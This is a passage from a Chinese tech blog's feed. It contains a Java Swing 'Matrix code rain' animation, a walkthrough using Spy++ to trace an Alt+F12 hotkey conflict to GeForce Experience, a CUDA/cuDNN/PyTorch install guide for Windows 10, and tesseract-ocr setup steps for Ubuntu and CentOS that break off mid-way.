class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wiki.zimo.helper.CharHelper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyListener;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.MemoryImageSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rain</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 屏幕大小</span></span><br><span class="line">    <span class="keyword">private</span> Dimension screen;</span><br><span class="line">    <span class="comment">// 画布容器</span></span><br><span class="line">    <span class="keyword">private</span> JPanel graphicsPanel;</span><br><span class="line">    <span class="comment">// 字符大小</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size = <span class="number">16</span>;</span><br><span class="line">    <span class="comment">// 划分屏幕区域，行数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> rows;</span><br><span class="line">    <span class="comment">// 划分屏幕区域，列数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> cols;</span><br><span class="line">    <span class="comment">// 随机</span></span><br><span class="line">    <span class="keyword">private</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line">    <span class="comment">// 保存每列字符下落的坐标，雨滴的头的初始坐标——Y坐标</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] drops;</span><br><span class="line">    <span class="comment">// 雨滴的身体最大长度</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> maxLength = <span class="number">30</span>;</span><br><span class="line">    <span class="comment">// 一次下落的最大列数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> maxDrop = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Rain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取屏幕大小</span></span><br><span class="line">        screen = getToolkit().getScreenSize();</span><br><span class="line">        <span class="comment">// 设置去掉标题栏</span></span><br><span class="line">        setUndecorated(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 设置光标不可见</span></span><br><span class="line">        Toolkit defaultToolkit = Toolkit.getDefaultToolkit();</span><br><span class="line">        Image image = defaultToolkit.createImage(<span class="keyword">new</span> MemoryImageSource(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">null</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">        Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, <span class="keyword">new</span> Point(<span class="number">0</span>, <span class="number">0</span>), <span class="string">"cursor"</span>);</span><br><span class="line">        setCursor(invisibleCursor);</span><br><span class="line">        <span class="comment">// 设置全屏</span></span><br><span class="line">        setSize(screen);</span><br><span class="line">        <span class="comment">// 设置按esc键退出</span></span><br><span class="line">        addKeyListener(<span class="keyword">new</span> KeyListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyTyped</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyPressed</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123;</span><br><span class="line">                    System.exit(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyReleased</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        graphicsPanel = <span class="keyword">new</span> GraphicsPanel();</span><br><span class="line">        <span class="comment">// 设置面板</span></span><br><span class="line">        setContentPane(graphicsPanel);</span><br><span class="line">        <span class="comment">// 设置界面可显示</span></span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置行数和列数</span></span><br><span class="line">        rows = screen.width / size;</span><br><span class="line">        cols = screen.height / size;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        drops = <span class="keyword">new</span> <span class="keyword">int</span>[rows];</span><br><span class="line">        <span class="comment">// 随机drops</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; drops.length; i++) &#123;</span><br><span class="line">            drops[i] = random.nextInt(cols);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 开启定时刷新</span></span><br><span class="line">        <span class="keyword">new</span> Refresher(<span class="number">100</span>, graphicsPanel).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 获取随机ASCII可见字符</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">char</span> <span class="title">getRandomChar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">char</span>) (<span class="keyword">new</span> Random().nextInt(<span class="number">94</span>) + <span class="number">33</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 画布容器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">GraphicsPanel</span> <span class="keyword">extends</span> <span class="title">JPanel</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 设置背景黑色填充</span></span><br><span class="line">            Font font = g.getFont();</span><br><span class="line">            g.setColor(Color.BLACK);</span><br><span class="line">            g.fillRect(<span class="number">0</span>, <span class="number">0</span>, screen.width, screen.height);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 按行遍历</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; rows; x++) &#123;</span><br><span class="line">                <span class="comment">// 取出随机的y坐标</span></span><br><span class="line">                <span class="keyword">int</span> y = drops[x];</span><br><span class="line">                <span class="comment">// 画出雨滴的头</span></span><br><span class="line">                g.setColor(Color.CYAN);</span><br><span class="line">                g.setFont(<span class="keyword">new</span> Font(<span class="string">"黑体"</span>, Font.BOLD, size));</span><br><span class="line">                g.drawString(String.valueOf(CharHelper.getRandomChar()), x * size, y * size);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 倒着往回画出雨滴的身体，颜色渐变</span></span><br><span class="line">                <span class="keyword">int</span> color = <span class="number">255</span>;</span><br><span class="line">                <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (--y &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    len++;</span><br><span class="line">                    color -= <span class="number">255</span> / y;</span><br><span class="line">                    <span class="keyword">if</span> (color &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        color = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    g.setFont(font);</span><br><span class="line">                    g.setColor(<span class="keyword">new</span> Color(<span class="number">0</span>, color, <span class="number">0</span>, color));</span><br><span class="line">                    g.drawString(String.valueOf(CharHelper.getRandomChar()), x * size, y * size);</span><br><span class="line">                    <span class="keyword">if</span> (len &gt;= maxLength) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 随机雨滴下落</span></span><br><span class="line">                drops[x] += random.nextInt(maxDrop);</span><br><span class="line">                <span class="comment">// 完全坠落</span></span><br><span class="line">                <span class="keyword">if</span> (drops[x] &gt;= cols + maxLength) &#123;</span><br><span class="line">                    <span class="comment">// 随机开始</span></span><br><span class="line"><span class="comment">//                    drop[x] = random.nextInt(cols);</span></span><br><span class="line">                    <span class="comment">// 从头开始</span></span><br><span class="line">                    drops[x] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 定时刷新画布容器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Refresher</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> sleep;</span><br><span class="line">        <span class="keyword">private</span> JPanel panel;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Refresher</span><span class="params">(<span class="keyword">int</span> sleep, JPanel panel)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.sleep = sleep;</span><br><span class="line">            <span class="keyword">this</span>.panel = panel;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 死循环固定休眠，即可达到定时刷新的效果</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    panel.repaint();</span><br><span class="line">                    Thread.sleep(sleep);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Rain();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>最终效果</p><p> <img src="/posts/a49748b4/2020-08-10-18-45-55.gif" alt="最终效果图"></p></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;相信大家都看过黑客帝国，里面炫酷的代码雨一定给大家留下了深刻的印象，今天，博主就带大家用Java来实现这个特效，提
      
    
    </summary>
    
      <category term="java" scheme="https://blog.zimo.wiki/categories/java/"/>
    
    
      <category term="java" scheme="https://blog.zimo.wiki/tags/java/"/>
    
      <category term="黑客帝国" scheme="https://blog.zimo.wiki/tags/%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD/"/>
    
      <category term="代码雨" scheme="https://blog.zimo.wiki/tags/%E4%BB%A3%E7%A0%81%E9%9B%A8/"/>
    
  </entry>
  
  <entry>
    <title>记一次排查jetbrains系列ide（如idea，pycharm等） alt+f12 快捷键被占用问题解决过程</title>
    <link href="https://blog.zimo.wiki/posts/b42d5264/"/>
    <id>https://blog.zimo.wiki/posts/b42d5264/</id>
    <published>2020-07-26T17:01:36.000Z</published>
    <updated>2022-05-04T02:56:01.502Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>事件经过：最近不知怎么的了，博主的idea和pycharm等jetbrains系列ide突然都无法使用alt+f12（调出终端的）快捷键了，很让习惯了使用这个快捷键调出终端去执行git或者其他命令的博主不爽，于是便有了下面的探索过程</p></blockquote><h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>显然，无法使用快捷键的原因，明显是快捷键被某个程序占用了，或者说是热键冲突了</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>还是那句话，知道了原因之后，解决方案就好办了，大概的思路应该是下面这样</p><ol><li>找到占用快捷键的程序，或者说找到快捷键冲突的原因</li><li>解决冲突</li></ol><h3 id="找到快捷键冲突原因"><a href="#找到快捷键冲突原因" class="headerlink" title="找到快捷键冲突原因"></a>找到快捷键冲突原因</h3><p>通过搜索，博主发现windows下查看快捷键的工具有很多，比如<code>Hotkey Exporer</code>，<code>PCHunter</code>等等，但这二者都不好用，要么死机，要么驱动加载失败，但幸运的是，功夫不负有心人，最终博主找到了<a href="https://baike.baidu.com/item/spy++/2439496" target="_blank" rel="noopener"><code>spy++</code></a>这个强大的工具</p><ol><li>下载spy++，某盘链接：<a href="https://pan.baidu.com/s/1OlesQcdGJZY2Xq4B-tZtAQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1OlesQcdGJZY2Xq4B-tZtAQ</a> 提取码：46l3 </li><li>解压到你喜欢的目录下，根据系统架构的不同，直接双击对应的<code>exe</code>执行<br><img src="/posts/b42d5264/2020-07-27-10-21-14.png" alt="spy++"></li><li>打开软件后，选择左上角菜单spy-&gt;log messages，弹出配置消息日志对话框<br><img src="/posts/b42d5264/2020-07-27-10-23-50.png" alt="log messages"></li><li>勾选all windows in system，然后选择message，感觉看文字描述不清晰的小伙伴，就看图<br><img src="/posts/b42d5264/2020-07-27-10-26-24.png" alt="配置消息日志对话框"></li><li>点击clear all，取消选中所有的消息<br><img src="/posts/b42d5264/2020-07-27-10-28-38.png" alt="clear all"></li><li>在上一张图蓝色下拉区域中，下拉到偏后的位置，选中wm_hotkey<br><img src="/posts/b42d5264/2020-07-27-10-31-45.png" alt="选中wm_hotkey"></li><li>然后按被占用的快捷键，我这里是 <kbd> alt </kbd> + <kbd> f12 </kbd>，就会在窗体中出现一条消息记录<br><img src="/posts/b42d5264/2020-07-27-10-33-50.png" alt="消息记录"></li><li>选中消息，右键点击properties，弹出属性对话框<br><img src="/posts/b42d5264/2020-07-27-10-34-46.png" alt="properties"></li><li>在属性对话框中，点击蓝色的超链接 window handle<br><img src="/posts/b42d5264/2020-07-27-10-36-23.png" alt="window handle"></li><li>弹出具体的应用窗口属性对话框，在对话框中选择process面板，点击蓝色超链接，就会打开应用进程详情窗口<br><img src="/posts/b42d5264/2020-07-27-10-38-20.png" alt="选择process面板"></li><li>在应用详情窗口中，model name 就是占用 <kbd> alt </kbd> + <kbd> f12 </kbd> 快捷键的应用的名称<br><img src="/posts/b42d5264/2020-07-27-10-39-56.png" alt="model name"></li><li>通过搜索，发现这个应用是属于NVIDIA GeForce Experience的一个组件，到这里终于真相大白了</li></ol><h3 id="解决快捷键冲突"><a href="#解决快捷键冲突" class="headerlink" title="解决快捷键冲突"></a>解决快捷键冲突</h3><p>由于经常使用jetbrains系列的ide，已经习惯了，而且如果要调整ide的快捷键，就要调整所有jetbrains系列ide的，比较多，麻烦，所以我选择了调整NVIDIA GeForce Experience的快捷键设置</p><ol><li>打开GeForce Experience，点击右上角设置图标<br><img src="/posts/b42d5264/2020-07-27-10-59-23.png" alt="设置图标"></li><li>注意到设置中的游戏内覆盖中有提示到按下 <kbd> alt </kbd> + <kbd> z </kbd> 分享游戏，猜想这里面应该有快捷键设置，点击设置，进入该设置详情<br><img src="/posts/b42d5264/2020-07-27-11-00-10.png" alt="快捷键设置"></li><li>果不其然，在弹出的窗口中，我们发现了键盘快捷键设置按钮，点击它<br><img src="/posts/b42d5264/2020-07-27-11-02-50.png" alt="键盘快捷键设置"></li><li>在弹出来的面板中，我们果然发现了占用快捷键 <kbd> alt </kbd> + <kbd> f12 </kbd> 的操作<br><img src="/posts/b42d5264/2020-07-27-11-04-13.png" alt="发现罪魁祸首"></li><li>点中它，按钮为绿色时，按下你想更新的快捷键（组合键），我这里设置为 <kbd> shift </kbd> + <kbd> alt </kbd> + <kbd> f12 </kbd><br><img src="/posts/b42d5264/2020-07-27-11-09-31.png" alt="重置快捷键"></li><li>打开idea等jetbrains系列ide验证， <kbd> alt </kbd> + <kbd> f12 </kbd> 成功调出终端，问题解决，enjoy！！！<br><img src="/posts/b42d5264/2020-07-27-11-13-28.png" alt="问题解决"></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;事件经过：最近不知怎么的了，博主的idea和pycharm等jetbrains系列ide突然都无法使用alt+f1
      
    
    </summary>
    
      <category term="随笔" scheme="https://blog.zimo.wiki/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="windows" scheme="https://blog.zimo.wiki/tags/windows/"/>
    
      <category term="快捷键冲突" scheme="https://blog.zimo.wiki/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%86%B2%E7%AA%81/"/>
    
      <category term="jetbrains" scheme="https://blog.zimo.wiki/tags/jetbrains/"/>
    
  </entry>
  
  <entry>
    <title>win10下安装cuda+cudnn+pytorch</title>
    <link href="https://blog.zimo.wiki/posts/3908d582/"/>
    <id>https://blog.zimo.wiki/posts/3908d582/</id>
    <published>2020-07-21T03:22:50.000Z</published>
    <updated>2022-05-04T02:56:01.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol><li>桌面右键选择NVIDIA控制面板，然后依次选择帮助-&gt;系统信息-&gt;组件<br><img src="/posts/3908d582/2020-07-21-11-30-56.png" alt="查看电脑CUDA驱动适配版本"></li><li>可以看到我这台笔记本支持的cuda版本是<code>10.2.95</code>，记住这个<br><img src="/posts/3908d582/2020-07-21-11-36-25.png" alt="下载cuda"></li><li>然后去<a href="https://developer.nvidia.com/cuda-toolkit-archive" target="_blank" rel="noopener">nvidia官网</a>下载对应的驱动程序包<br><img src="/posts/3908d582/2020-07-21-11-40-33.png" alt="选择对应的cuda版本"></li><li>然后去<a href="https://developer.nvidia.com/rdp/cudnn-download" target="_blank" rel="noopener">下载</a>对应的cudnn<br><img src="/posts/3908d582/2020-07-21-11-44-00.png" alt="下载cudnn">，下载cudnn需要NVIDIA账号，如果没有，建议使用163邮箱注册一个（为什么呢？因为QQ邮箱现在收不到NVIDIA的邮件，这就不知道到底是腾讯的问题还是英伟达的问题，亦或者是两者都有问题，手动狗头）</li><li>单独提一嘴，如果下载速度很慢的话，不要奇怪，国外的网站是这样的，想提高下载速度，请挂科学上网，或者是自己找大佬们下载好放在网盘里的资源</li></ol><h2 id="安装cuda"><a href="#安装cuda" class="headerlink" title="安装cuda"></a>安装cuda</h2><ol><li>直接双击运行下载好的exe就行<br><img src="/posts/3908d582/2020-07-21-11-53-38.png" alt="下载好的cuda和cudnn"></li><li>基本都是下一步下一步下一步，没啥好说的</li><li>验证cuda，命令<code>nvcc -V</code>，看到如下图所示就行了<br><img src="/posts/3908d582/2020-07-21-11-56-08.png" alt="验证cuda"></li></ol><h2 id="配置cudnn"><a href="#配置cudnn" class="headerlink" title="配置cudnn"></a>配置cudnn</h2><ol><li>解压cudnn压缩包<br><img src="/posts/3908d582/2020-07-21-11-57-53.png" alt="cudnn解压后"></li><li>直接 <kbd>Ctrl</kbd> + <kbd>A</kbd> 全选，然后 <kbd>Ctrl</kbd> + <kbd>C</kbd> 复制，然后进入<code>C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2</code>目录下（请注意根据版本等选择对应的目录，不要无脑就直接用我这个目录）， <kbd>Ctrl</kbd> + <kbd>V</kbd> 粘贴</li></ol><h2 id="安装pytorch"><a href="#安装pytorch" class="headerlink" title="安装pytorch"></a>安装pytorch</h2><ol><li>去<a href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener">pytorch官网</a>，根据操作系统，python包管理等选择对应的选项<br><img src="/posts/3908d582/2020-07-21-12-03-39.png" alt="选择pytorch安装命令"></li><li>复制上面选择后出现的安装命令，我这里选的是pip，命令行执行<code>pip install torch===1.5.1 torchvision===0.6.1 -f https://download.pytorch.org/whl/torch_stable.html</code></li><li>等待安装完成，可能会比较慢，请挂科学上网</li></ol><h2 id="验证pytorch"><a href="#验证pytorch" class="headerlink" title="验证pytorch"></a>验证pytorch</h2><ol><li><p>进入python交互式解释器，cmd中执行<code>python</code>命令即可<br><img src="/posts/3908d582/2020-07-21-12-09-39.png" alt="python交互式解释器"></p></li><li><p>参考官方示例进行验证<br> 官方示例：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">x = torch.rand(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p> 输出：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tensor([[<span class="number">0.3380</span>, <span class="number">0.3845</span>, <span class="number">0.3217</span>],</span><br><span class="line">[<span class="number">0.8337</span>, <span class="number">0.9050</span>, <span class="number">0.2650</span>],</span><br><span class="line">[<span class="number">0.2979</span>, <span class="number">0.7141</span>, <span class="number">0.9069</span>],</span><br><span class="line">[<span class="number">0.1449</span>, <span class="number">0.1132</span>, <span class="number">0.1375</span>],</span><br><span class="line">[<span class="number">0.4675</span>, <span class="number">0.3947</span>, <span class="number">0.1426</span>]])</span><br></pre></td></tr></table></figure></li><li><p>验证cuda<br> 官方示例：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import torch</span><br><span class="line">torch.cuda.is_available()</span><br></pre></td></tr></table></figure><p> 输出：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></li><li><p>验证通过，enjoy it!</p></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;桌面右键选择NVIDIA控制面板，然后依次选择帮助-&amp;gt;系统信息-&amp;gt;组件&lt;br&gt;&lt;img src=&quot;/posts/39
      
    
    </summary>
    
      <category term="机器学习" scheme="https://blog.zimo.wiki/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="机器学习" scheme="https://blog.zimo.wiki/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="cuda" scheme="https://blog.zimo.wiki/tags/cuda/"/>
    
      <category term="pytorch" scheme="https://blog.zimo.wiki/tags/pytorch/"/>
    
      <category term="环境搭建" scheme="https://blog.zimo.wiki/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>ubantu配置安装tesseract-ocr</title>
    <link href="https://blog.zimo.wiki/posts/c417f07b/"/>
    <id>https://blog.zimo.wiki/posts/c417f07b/</id>
    <published>2020-07-16T09:30:39.000Z</published>
    <updated>2022-05-04T02:56:01.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ubantu"><a href="#ubantu" class="headerlink" title="ubantu"></a>ubantu</h1><ol><li>使用命令<code>sudo apt install tesseract-ocr</code>安装tesseract-ocr</li><li>使用命令<code>whereis tesseract-ocr</code>查看tesseract-ocr的位置<br><img src="/posts/c417f07b/2020-07-16-17-45-55.png" alt="tesseract-ocr的位置"></li><li>使用命令<code>cd  /usr/share/tesseract-ocr</code>进入到tesseract-ocr的位置</li><li>使用命令<code>ls</code>查看该目录下有什么<br><img src="/posts/c417f07b/2020-07-16-17-54-02.png" alt="查看该目录下有什么"></li><li>使用命令<code>cd tessdata/</code>进入到tessdata目录</li><li>使用命令<code>pwd</code>打印当前工作目录，记录下打印出来的结果<code>/usr/share/tesseract-ocr/tessdata</code><br><img src="/posts/c417f07b/2020-07-16-17-58-40.png" alt="打印当前工作目录"></li><li>使用<code>vim</code>编辑<code>/etc/profile</code>，命令<code>sudo vim /etc/profile</code></li><li>使用<code>i</code>进入<code>insert</code>模式，使用方向键，将光标移动到最末未位置，添加一行<code>export TESSDATA_PREFIX=/usr/share/tesseract-ocr/tessdata</code></li><li><code>:x</code>保存并退出，使用<code>source</code>命令刷新<code>/etc/profile</code><br><img src="/posts/c417f07b/2020-07-16-18-09-38.png" alt="刷新/etc/profile"></li><li>enjoy it!</li></ol><h1 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h1><ol><li><p>先尝试安装tesseract，命令</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install tesseract</span><br></pre></td></tr></table></figure><p> <strong>如果安装成功，直接进入第6步，否则，从第2步往下依次执行</strong></p></li><li><p>添加yum源，命令</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo https://download.opensuse.org/repositories/home:/Alexander_Pozdnyakov/CentOS_7/</span><br></pre></td></tr></table></figure></li><li><p>导入密钥，命令</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rpm --import https://build.opensuse.org/projects/home:Alexander_Pozdnyakov/public_key</span><br></pre></td></tr></table></figure></li><li><p>更新，命令</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum update</span><br></pre></td></tr></table></figure></li><li><p>安装tesseract，命令</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install tesseract</span><br></pre></td></tr></table></figure></li><li><p>查看tesseract的位置，命令</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis tesseract</span><br></pre></td></tr></table></figure><p> <img src="/posts/c417f07b/2020-07-29-23-14-51.png" alt="tesseract的位置"><br> <strong>记住，图中标出来的位置<code>/usr/share/tesseract</code></strong></p></li><li><p>cd到该位置，命令</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/tesseract/</span><br></pre></td></tr></table></figure></li><li><p>列出该目录下的文件，命令</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 